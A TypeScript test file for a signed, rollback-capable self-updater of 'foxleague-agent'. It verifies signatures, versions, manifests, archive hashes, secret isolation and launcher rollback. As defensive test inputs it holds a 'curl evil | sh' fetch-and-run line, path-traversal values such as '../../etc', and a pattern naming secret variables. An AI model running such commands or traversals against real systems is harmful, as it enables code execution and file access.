// The one-click update (owner, 2026-11-11): a release is taken only when it is signed by a pinned key, newer than
// the installed one and byte for byte the archive that was signed; the running release is never written to; an
// update that does not start is undone by the launcher. Each test is named after the rule it holds.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync, spawnSync } from 'node:child_process'
import { existsSync, readFileSync, readdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  UpdateError, archiveName, downloadArchive, fetchRelease, isNewer, manifestBytes, parseManifest, signManifest, verifyManifest, type Manifest,
} from '../src/update/release.ts'
import { activate, childEnv, confirmStart, detectLayout, selfUpdateRefusal, stage, startNote } from '../src/update/install.ts'
import { buildRelease, codeTree, managedInstall, publish, serve, testKey, tmp } from './update-fixtures.ts'

const KEY = testKey()
const OTHER = testKey()
const M: Manifest = { name: 'foxleague-agent', version: '1.2.0', sha256: 'a'.repeat(64), size: 1000, published: '2026-11-11T10:00:00Z', notes: 'Notes.' }

test('UPD-1: a manifest counts only with a signature of exactly its bytes by a pinned key', () => {
  const bytes = manifestBytes(M)
  const sig = signManifest(bytes, KEY.privatePem)
  assert.equal(verifyManifest(bytes, sig, [KEY.publicPem]), true)
  assert.equal(verifyManifest(bytes, sig, [OTHER.publicPem, KEY.publicPem]), true, 'any pinned key (rotation)')
  assert.equal(verifyManifest(bytes, sig, [OTHER.publicPem]), false, 'a key that is not pinned')
  assert.equal(verifyManifest(bytes, sig, []), false, 'no pinned key verifies nothing')
  const changed = manifestBytes({ ...M, sha256: 'b'.repeat(64) })
  assert.equal(verifyManifest(changed, sig, [KEY.publicPem]), false, 'another archive under the same signature')
  assert.equal(verifyManifest(bytes, signManifest(bytes, OTHER.privatePem), [KEY.publicPem]), false, 'signed by someone else')
  for (const bad of ['', 'AAAA', sig.slice(0, -4), sig + sig, 'not base64 at all!!', `${'A'.repeat(86)}=`]) assert.equal(verifyManifest(bytes, bad, [KEY.publicPem]), false, `signature ${JSON.stringify(bad.slice(0, 12))}`)
  assert.equal(verifyManifest(bytes, sig, ['not a key', KEY.publicPem]), true, 'an unreadable key is skipped, not fatal')
})

test('UPD-2: only a later plain version is newer; a downgrade, the same version and anything unreadable are not', () => {
  assert.equal(isNewer('1.2.1', '1.2.0'), true)
  assert.equal(isNewer('1.10.0', '1.9.9'), true, 'numbers, not text')
  assert.equal(isNewer('2.0.0', '1.99.99'), true)
  assert.equal(isNewer('1.2.0', '1.2.0'), false, 'the same version')
  assert.equal(isNewer('1.1.9', '1.2.0'), false, 'a downgrade')
  for (const odd of ['v1.3.0', '1.3', '1.3.0-beta', '1.3.0.1', '01.3.0', '', ' 1.3.0', '1.3.0\n', '9999999.0.0', null, undefined, 13]) {
    assert.equal(isNewer(odd, '1.2.0'), false, `candidate ${JSON.stringify(odd)}`)
    assert.equal(isNewer('1.3.0', odd), false, `installed ${JSON.stringify(odd)}`)
  }
})

test('UPD-3: the manifest is read strictly: its known fields only, each of its type and range', () => {
  assert.deepEqual(parseManifest(manifestBytes(M)), M)
  const bad = (o: Record<string, unknown>, why: string): void => {
    assert.throws(() => parseManifest(new TextEncoder().encode(JSON.stringify(o))), UpdateError, why)
  }
  bad({ ...M, name: 'something-else' }, 'another program')
  bad({ ...M, version: '1.2' }, 'no plain version')
  bad({ ...M, sha256: 'A'.repeat(64) }, 'upper case is not the format')
  bad({ ...M, sha256: 'a'.repeat(63) }, 'short hash')
  bad({ ...M, size: 0 }, 'empty archive')
  bad({ ...M, size: 1.5 }, 'not whole')
  bad({ ...M, size: 10 ** 12 }, 'larger than any release')
  bad({ ...M, size: '1000' }, 'a number as text')
  bad({ ...M, published: 'soon' }, 'no date')
  bad({ ...M, notes: 'x'.repeat(5000) }, 'notes too long')
  bad({ ...M, run: 'curl evil | sh' }, 'an unknown field')
  const { notes: _n, ...noNotes } = M
  bad(noNotes, 'a missing field')
  assert.throws(() => parseManifest(new TextEncoder().encode('[]')), UpdateError)
  assert.throws(() => parseManifest(new TextEncoder().encode('{"name":')), UpdateError)
  assert.throws(() => parseManifest(new Uint8Array(0)), UpdateError)
  assert.throws(() => parseManifest(new Uint8Array(64 * 1024)), UpdateError, 'larger than a manifest')
})

test('UPD-4: the newest release is taken from the server only with its signature; anything else is refused', async () => {
  const tree = codeTree(tmp(), '1.2.0')
  const good = tmp()
  const built = buildRelease(good, tree, '1.2.0', KEY.privatePem)
  const site = publish(tmp(), [{ dir: good, version: '1.2.0' }], '1.2.0')
  const web = await serve(site)
  try {
    const got = await fetchRelease(web.base, [KEY.publicPem])
    assert.deepEqual(got.manifest, built.manifest)
    assert.deepEqual((await fetchRelease(web.base, [KEY.publicPem], { version: '1.2.0' })).manifest, built.manifest, 'a given version')
    await assert.rejects(fetchRelease(web.base, [OTHER.publicPem]), /not signed by the foxleague-agent maintainers/)
    await assert.rejects(fetchRelease(web.base, []), /holds no release key/, 'a build without a key refuses, it does not trust')
    await assert.rejects(fetchRelease(web.base, [KEY.publicPem], { version: '9.9.9' }), UpdateError, 'a version that is not published')
  } finally {
    await web.close()
  }
  // The manifest swapped for one that names another archive, the signature left as it was.
  const forged = manifestBytes({ ...built.manifest, sha256: 'c'.repeat(64) })
  const swapped = await serve(site, { rewrite: p => (p === '/latest/download/release.json' ? { body: forged } : undefined) })
  try {
    await assert.rejects(fetchRelease(swapped.base, [KEY.publicPem]), /not signed/)
  } finally {
    await swapped.close()
  }
  // No signature file, a giant manifest, a server error, a redirect to the real file.
  const odd = await serve(site, {
    rewrite: p =>
      p === '/a/latest/download/release.json.sig' ? { status: 404 }
      : p === '/b/latest/download/release.json' ? { body: new Uint8Array(200_000) }
      : p === '/c/latest/download/release.json' ? { status: 500 }
      : p.startsWith('/d/') ? { location: p.slice(2) }
      : p.startsWith('/a/') ? { location: p.slice(2) }
      : undefined,
  })
  try {
    await assert.rejects(fetchRelease(`${odd.base}/a`, [KEY.publicPem]), UpdateError, 'no signature file')
    await assert.rejects(fetchRelease(`${odd.base}/b`, [KEY.publicPem]), /more than a release file holds/)
    await assert.rejects(fetchRelease(`${odd.base}/c`, [KEY.publicPem]), /answered 500/)
    assert.equal((await fetchRelease(`${odd.base}/d`, [KEY.publicPem])).manifest.version, '1.2.0', 'a redirect is followed: the signature is what counts')
  } finally {
    await odd.close()
  }
  await assert.rejects(fetchRelease('http://example.com/releases', [KEY.publicPem]), /must be https/, 'plain http only to this machine')
  await assert.rejects(fetchRelease('file:///etc', [KEY.publicPem]), /must be https/)
  await assert.rejects(fetchRelease('https://user:pw@example.com/r', [KEY.publicPem]), /must not carry a login/)
})

test('UPD-5: the archive is kept only when it is the signed one: its size and its SHA-256', async () => {
  const tree = codeTree(tmp(), '1.2.0')
  const out = tmp()
  const built = buildRelease(out, tree, '1.2.0', KEY.privatePem)
  const site = publish(tmp(), [{ dir: out, version: '1.2.0' }], '1.2.0')
  const real = readFileSync(built.archive)
  const path = `/download/v1.2.0/${archiveName('1.2.0')}`
  const dest = join(tmp(), 'a.tar.gz')
  const ok = await serve(site)
  try {
    await downloadArchive(ok.base, built.manifest, dest)
    assert.deepEqual(readFileSync(dest), real)
  } finally {
    await ok.close()
  }
  const flipped = Buffer.from(real)
  flipped[flipped.length - 20]! ^= 0xff
  for (const [body, why] of [
    [flipped, /SHA-256 differs/],
    [Buffer.concat([real, Buffer.from('extra')]), /larger than the signed release/],
    [real.subarray(0, real.length - 10), /not the size of the signed release/],
  ] as const) {
    const web = await serve(site, { rewrite: p => (p === path ? { body } : undefined) })
    const d = join(tmp(), 'b.tar.gz')
    try {
      await assert.rejects(downloadArchive(web.base, built.manifest, d), why)
      assert.equal(existsSync(d), false, 'a refused download leaves no file')
    } finally {
      await web.close()
    }
  }
})

test('UPD-6: only an install made by the one-line installer updates itself; the others are told how', () => {
  const inst = managedInstall('1.1.0')
  const layout = detectLayout(inst.code)
  assert.deepEqual(layout, { root: inst.root, code: inst.code, managed: true })
  assert.equal(selfUpdateRefusal(layout), null)
  assert.match(selfUpdateRefusal(layout, { isServer: true })!, /server set up by hand/)
  const flat = codeTree(tmp(), '1.1.0')
  assert.deepEqual(detectLayout(flat), { root: flat, code: flat, managed: false })
  assert.match(selfUpdateRefusal(detectLayout(flat))!, /paste the install line again/)
  execFileSync('mkdir', [join(flat, '.git')])
  assert.match(selfUpdateRefusal(detectLayout(flat))!, /git checkout/)
  // A folder that merely sits in something called versions, without being the active one, is not managed.
  const stray = codeTree(join(tmp(), 'versions', 'v1.1.0'), '1.1.0')
  assert.equal(detectLayout(stray).managed, false)
})

test('UPD-7: an update is unpacked next to the running release, prepared by the NEW release and never touches the old one', async () => {
  const inst = managedInstall('1.1.0')
  const layout = detectLayout(inst.code)
  const before = readFileSync(join(inst.code, 'src', 'service.ts'), 'utf8')
  const out = tmp()
  const built = buildRelease(out, codeTree(tmp(), '1.2.0'), '1.2.0', KEY.privatePem)
  // The service's own environment holds the recovery words and the keys: none of it reaches the update's commands.
  const env = childEnv(inst.root, { PATH: process.env.PATH, HOME: process.env.HOME, AGENT_MNEMONIC: 'twelve secret words', ANTHROPIC_API_KEY: 'sk-secret', TELEGRAM_BOT_TOKEN: '1:secret', WEB_UI_PASSWORD_HASH: 'hash' })
  const name = await stage(layout, built.manifest, built.archive, { env })
  assert.equal(name, 'v1.2.0')
  const next = join(inst.root, 'versions', 'v1.2.0')
  assert.equal(readFileSync(join(next, '.prepared'), 'utf8').trim(), '--prepare', 'the new release prepared itself')
  const seen = readFileSync(join(next, '.prepare-env'), 'utf8')
  assert.match(seen, new RegExp(`^FOXAGENT_ROOT=${inst.root}$`, 'm'))
  assert.doesNotMatch(seen, /secret|AGENT_MNEMONIC|ANTHROPIC_API_KEY|TELEGRAM_BOT_TOKEN|PASSWORD/, 'no secret in the environment of the update')
  assert.equal(readFileSync(join(inst.code, 'src', 'service.ts'), 'utf8'), before, 'the running release is untouched')
  assert.equal(readFileSync(join(inst.root, 'versions', 'active'), 'utf8'), 'v1.1.0\n', 'staging does not switch')
  assert.deepEqual(readdirSync(join(inst.root, 'versions')).sort(), ['active', 'v1.1.0', 'v1.2.0'])
})

test('UPD-8: a release that cannot be prepared, lies about its version or climbs out of its folder changes nothing', async () => {
  const inst = managedInstall('1.1.0')
  const layout = detectLayout(inst.code)
  const left = (): string[] => readdirSync(join(inst.root, 'versions')).sort()
  // Its own prepare step fails (dependencies, the recovery words check).
  const failing = buildRelease(tmp(), codeTree(tmp(), '1.2.0', { prepare: '#!/usr/bin/env bash\necho "npm ci failed" >&2\nexit 3\n' }), '1.2.0', KEY.privatePem)
  await assert.rejects(stage(layout, failing.manifest, failing.archive), /could not be prepared, nothing was changed: .*npm ci failed/)
  assert.deepEqual(left(), ['active', 'v1.1.0'])
  // The archive holds 1.5.0 under a manifest that says 1.2.0.
  const liar = buildRelease(tmp(), codeTree(tmp(), '1.5.0'), '1.2.0', KEY.privatePem)
  await assert.rejects(stage(layout, liar.manifest, liar.archive), /another version than its signed manifest/)
  assert.deepEqual(left(), ['active', 'v1.1.0'])
  // A member that climbs out of the archive's folder.
  const evilDir = tmp()
  codeTree(join(evilDir, 'foxleague-agent-v1.2.0'), '1.2.0')
  writeFileSync(join(evilDir, 'outside.txt'), 'x')
  const evil = join(tmp(), 'evil.tar.gz')
  execFileSync('tar', ['-czf', evil, '-C', evilDir, 'foxleague-agent-v1.2.0', 'outside.txt'])
  await assert.rejects(stage(layout, { ...M, version: '1.2.0' }, evil), /outside its own folder/)
  assert.deepEqual(left(), ['active', 'v1.1.0'])
  assert.equal(existsSync(join(inst.root, 'outside.txt')), false)
  // Not an archive at all.
  const junk = join(tmp(), 'junk.tar.gz')
  writeFileSync(junk, 'this is not gzip')
  await assert.rejects(stage(layout, { ...M, version: '1.2.0' }, junk), /could not be read/)
  // The running release itself is never replaced.
  const same = buildRelease(tmp(), codeTree(tmp(), '1.1.0'), '1.1.0', KEY.privatePem)
  await assert.rejects(stage(layout, same.manifest, same.archive), /already running/)
  await assert.rejects(stage({ root: inst.code, code: inst.code, managed: false }, failing.manifest, failing.archive), /cannot update itself/)
})

const launch = (root: string): number => spawnSync('bash', [join(root, 'run.sh')], { env: { PATH: process.env.PATH ?? '' }, encoding: 'utf8' }).status ?? -1

test('UPD-9: the launcher starts the active release, and a release that comes up keeps its place', async () => {
  const inst = managedInstall('1.1.0')
  assert.equal(launch(inst.root), 0)
  assert.deepEqual(inst.started(), [join(inst.root, 'versions', 'v1.1.0', 'src', 'service.ts')])
  const built = buildRelease(tmp(), codeTree(tmp(), '1.2.0'), '1.2.0', KEY.privatePem)
  const layout = detectLayout(inst.code)
  activate(layout, await stage(layout, built.manifest, built.archive))
  assert.equal(readFileSync(join(inst.root, 'versions', 'active'), 'utf8'), 'v1.2.0\n')
  assert.equal(readFileSync(join(inst.root, 'versions', 'pending'), 'utf8'), 'v1.1.0 v1.2.0 0\n')
  assert.equal(launch(inst.root), 0)
  assert.equal(inst.started().at(-1), join(inst.root, 'versions', 'v1.2.0', 'src', 'service.ts'))
  // The new release, once up, reads what happened and confirms.
  const now = detectLayout(join(inst.root, 'versions', 'v1.2.0'))
  assert.deepEqual(startNote(now), { updatedFrom: 'v1.1.0' })
  confirmStart(now)
  assert.equal(existsSync(join(inst.root, 'versions', 'pending')), false)
  assert.deepEqual(startNote(now), {})
  assert.deepEqual(readdirSync(join(inst.root, 'versions')).sort(), ['active', 'previous', 'v1.1.0', 'v1.2.0'], 'the release before is kept for the next undo')
  // A third release: the oldest goes.
  const third = buildRelease(tmp(), codeTree(tmp(), '1.3.0'), '1.3.0', KEY.privatePem)
  activate(now, await stage(now, third.manifest, third.archive))
  assert.equal(launch(inst.root), 0)
  confirmStart(detectLayout(join(inst.root, 'versions', 'v1.3.0')))
  assert.deepEqual(readdirSync(join(inst.root, 'versions')).sort(), ['active', 'previous', 'v1.2.0', 'v1.3.0'])
})

test('UPD-10: an update that does not start is undone by the launcher after two tries, and the old release says so', async () => {
  const inst = managedInstall('1.1.0')
  const layout = detectLayout(inst.code)
  const built = buildRelease(tmp(), codeTree(tmp(), '1.2.0'), '1.2.0', KEY.privatePem)
  activate(layout, await stage(layout, built.manifest, built.archive))
  writeFileSync(join(inst.root, '.exit'), '1') // the new release crashes at start, so it never confirms
  assert.equal(launch(inst.root), 1)
  assert.equal(launch(inst.root), 1)
  assert.equal(readFileSync(join(inst.root, 'versions', 'active'), 'utf8'), 'v1.2.0\n', 'two tries first')
  writeFileSync(join(inst.root, '.exit'), '0')
  assert.equal(launch(inst.root), 0)
  const v = (n: string): string => join(inst.root, 'versions', n, 'src', 'service.ts')
  assert.deepEqual(inst.started(), [v('v1.2.0'), v('v1.2.0'), v('v1.1.0')], 'the third start is the release that ran before')
  assert.equal(readFileSync(join(inst.root, 'versions', 'active'), 'utf8'), 'v1.1.0\n')
  assert.equal(existsSync(join(inst.root, 'versions', 'pending')), false)
  assert.deepEqual(startNote(layout), { rolledBack: { to: 'v1.2.0' } })
  confirmStart(layout)
  assert.deepEqual(startNote(layout), {}, 'told once')
  assert.equal(launch(inst.root), 0)
  assert.equal(inst.started().at(-1), v('v1.1.0'), 'and it stays there')
})

test('UPD-11: the launcher refuses a versions/active that names anything but a release folder', () => {
  for (const bad of ['../../etc', '/abs/path', '.hidden', 'a b', '']) {
    const inst = managedInstall('1.1.0')
    writeFileSync(join(inst.root, 'versions', 'active'), `${bad}\n`)
    assert.equal(launch(inst.root), 1, `active = ${JSON.stringify(bad)}`)
    assert.deepEqual(inst.started(), [])
  }
  // A path that leaves versions/ and does hold a service: still refused, by its name alone.
  const out = managedInstall('1.1.0')
  codeTree(join(out.root, 'elsewhere'), '6.6.6')
  writeFileSync(join(out.root, 'versions', 'active'), '../elsewhere\n')
  assert.equal(launch(out.root), 1)
  assert.deepEqual(out.started(), [])
  // A note that names a release folder that is gone: no switch to nowhere.
  const inst = managedInstall('1.1.0')
  writeFileSync(join(inst.root, 'versions', 'pending'), 'v0.9.0 v1.1.0 2\n')
  assert.equal(launch(inst.root), 0)
  assert.equal(readFileSync(join(inst.root, 'versions', 'active'), 'utf8'), 'v1.1.0\n')
  assert.throws(() => activate(detectLayout(inst.code), '../x'), UpdateError)
  assert.throws(() => activate(detectLayout(inst.code), 'v7.7.7'), /not in place/)
})
